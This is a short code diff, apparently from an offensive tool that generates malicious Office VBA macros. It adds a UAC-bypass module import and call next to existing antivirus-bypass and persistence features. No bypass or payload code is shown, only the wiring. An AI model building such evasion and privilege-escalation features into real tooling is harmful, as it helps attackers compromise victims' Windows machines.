@@ -14,6 +14,7 @@ try:
     from pro_modules.persistance import Persistance
     from pro_modules.background import Background
     from pro_modules.av_bypass import AvBypass
+    from pro_modules.uac_bypass import UACBypass
 except:
     pass
 
@@ -92,6 +93,10 @@ class VBAGenerator(Generator):
             if self.mpSession.avBypass:
                 avBypasser = AvBypass(self.mpSession)
                 avBypasser.runPreObfuscation()
+                
+            if self.mpSession.uacBypass:
+                uacBypasser = UACBypass(self.mpSession)
+                uacBypasser.run()
             
             # MAcro to run in background    
             if self.mpSession.background:
